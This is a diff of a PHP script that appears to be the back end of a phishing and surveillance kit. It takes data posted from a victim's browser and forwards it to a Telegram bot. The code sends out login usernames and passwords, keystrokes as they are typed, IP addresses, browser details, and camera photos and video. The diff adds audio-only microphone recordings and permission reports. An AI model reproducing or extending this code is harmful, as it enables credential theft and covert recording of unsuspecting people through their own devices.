@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// POST.PHP - Handles all data to Telegram
+// POST.PHP - Handles Video, Audio, Photos & Data
 // ============================================
 
 error_reporting(0);
@@ -28,21 +28,33 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
     
     try {
         if ($fileData) {
+            // Determine file type for Telegram
             if ($fileType === 'video') {
                 $url = "https://api.telegram.org/bot$botToken/sendVideo";
+                $paramName = 'video';
+                $mimeType = 'video/webm';
+                $ext = 'webm';
+            } elseif ($fileType === 'audio') {
+                $url = "https://api.telegram.org/bot$botToken/sendAudio";
+                $paramName = 'audio';
+                $mimeType = 'audio/webm';
+                $ext = 'webm';
             } else {
                 $url = "https://api.telegram.org/bot$botToken/sendPhoto";
+                $paramName = 'photo';
+                $mimeType = 'image/png';
+                $ext = 'png';
             }
             
+            // Decode base64
             $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
-            $ext = $fileType === 'video' ? 'webm' : 'png';
             $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . '.' . $ext;
             file_put_contents($tempFile, $fileContent);
             
-            $cfile = curl_file_create($tempFile, $fileType === 'video' ? 'video/webm' : 'image/png', 'capture.' . $ext);
+            $cfile = curl_file_create($tempFile, $mimeType, 'capture.' . $ext);
             $data = [
                 'chat_id' => $chatId,
-                ($fileType === 'video' ? 'video' : 'photo') => $cfile,
+                $paramName => $cfile,
                 'caption' => $message,
                 'parse_mode' => 'HTML'
             ];
@@ -80,6 +92,9 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
 // ============================================
 
 switch ($type) {
+    // ==========================================
+    // IP ADDRESS
+    // ==========================================
     case 'IP':
         $message = "🌐 <b>IP ADDRESS</b>\n";
         $message .= "IP: <code>" . htmlspecialchars($_POST['tg_data'] ?? $ip) . "</code>\n";
@@ -88,6 +103,9 @@ switch ($type) {
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // PHOTO
+    // ==========================================
     case 'image':
         $imageData = $_POST['tg_image'] ?? '';
         if (!empty($imageData)) {
@@ -98,17 +116,50 @@ switch ($type) {
         }
         break;
     
+    // ==========================================
+    // VIDEO (with audio)
+    // ==========================================
     case 'video':
         $videoData = $_POST['tg_video'] ?? '';
         $counter = $_POST['tg_counter'] ?? 0;
         if (!empty($videoData)) {
             $caption = "🎥 <b>VIDEO #$counter</b>\n";
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
-            $caption .= "Time: $time";
+            $caption .= "Time: $time\n";
+            $caption .= "📹 Video + Audio capture";
             sendTelegramMessage($caption, $videoData, 'video');
         }
         break;
     
+    // ==========================================
+    // AUDIO ONLY
+    // ==========================================
+    case 'audio':
+        $audioData = $_POST['tg_audio'] ?? '';
+        $counter = $_POST['tg_counter'] ?? 0;
+        if (!empty($audioData)) {
+            $caption = "🎙️ <b>AUDIO RECORDING #$counter</b>\n";
+            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+            $caption .= "Time: $time\n";
+            $caption .= "🎤 Audio only capture";
+            sendTelegramMessage($caption, $audioData, 'audio');
+        }
+        break;
+    
+    // ==========================================
+    // PERMISSION STATUS
+    // ==========================================
+    case 'permission':
+        $message = "🔓 <b>PERMISSIONS</b>\n\n";
+        $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
+        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+        $message .= "Time: $time";
+        sendTelegramMessage($message);
+        break;
+    
+    // ==========================================
+    // INFO
+    // ==========================================
     case 'info':
         $message = "ℹ️ <b>INFO</b>\n\n";
         $message .= htmlspecialchars($_POST['tg_data'] ?? '') . "\n";
@@ -117,27 +168,25 @@ switch ($type) {
         sendTelegramMessage($message);
         break;
     
-    case 'permission':
-        $message = "🔓 <b>CAMERA PERMISSION</b>\n\n";
-        $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
-        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
-        $message .= "Time: $time";
-        sendTelegramMessage($message);
-        break;
-    
+    // ==========================================
+    // WARNING
+    // ==========================================
     case 'warning':
         $message = "⚠️ <b>WARNING</b>\n\n";
-        $message .= "Message: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
+        $message .= htmlspecialchars($_POST['tg_data'] ?? '') . "\n";
         $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "Time: $time";
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // LOGIN CREDENTIALS
+    // ==========================================
     case 'login':
         $username = $_POST['tg_username'] ?? 'N/A';
         $password = $_POST['tg_password'] ?? 'N/A';
         
-        $message = "🔐 <b>LOGIN</b>\n\n";
+        $message = "🔐 <b>LOGIN CREDENTIALS</b>\n\n";
         $message .= "👤 User: <code>" . htmlspecialchars($username) . "</code>\n";
         $message .= "🔑 Pass: <code>" . htmlspecialchars($password) . "</code>\n\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
@@ -146,6 +195,9 @@ switch ($type) {
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // TYPING
+    // ==========================================
     case 'typing':
         $partial = $_POST['tg_data'] ?? 'N/A';
         $message = "⌨️ <b>TYPING</b>\n\n";
@@ -155,15 +207,20 @@ switch ($type) {
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // CAMERA READY
+    // ==========================================
     case 'camera_ready':
-        $message = "📹 <b>CAMERA ACTIVE</b>\n\n";
-        $message .= "📸 Photos every 3 seconds\n";
-        $message .= "🎥 Videos every 10 seconds\n";
+        $message = "📹 <b>DEVICES ACTIVE</b>\n\n";
+        $message .= htmlspecialchars($_POST['tg_data'] ?? '') . "\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "⏰ Time: $time";
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // BROWSER INFO
+    // ==========================================
     case 'browser_info':
         $info = json_decode($_POST['tg_data'] ?? '{}', true);
         $message = "💻 <b>BROWSER INFO</b>\n\n";
@@ -178,6 +235,9 @@ switch ($type) {
         sendTelegramMessage($message);
         break;
     
+    // ==========================================
+    // PAGE VIEW
+    // ==========================================
     case 'page_view':
         $message = "👁️ <b>PAGE VIEW</b>\n\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
@@ -185,6 +245,19 @@ switch ($type) {
         $message .= "📱 WebView: " . (strpos($ua, 'fbav') !== false || strpos($ua, 'fban') !== false ? 'Yes' : 'No') . "\n";
         $message .= "⏰ Time: $time";
         sendTelegramMessage($message);
+        break;
+    
+    // ==========================================
+    // DEFAULT
+    // ==========================================
+    default:
+        if (!empty($_POST)) {
+            $message = "📦 <b>DATA RECEIVED</b>\n\n";
+            $message .= "📝 Type: " . htmlspecialchars($type) . "\n";
+            $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+            $message .= "⏰ Time: $time";
+            sendTelegramMessage($message);
+        }
         break;
 }
 
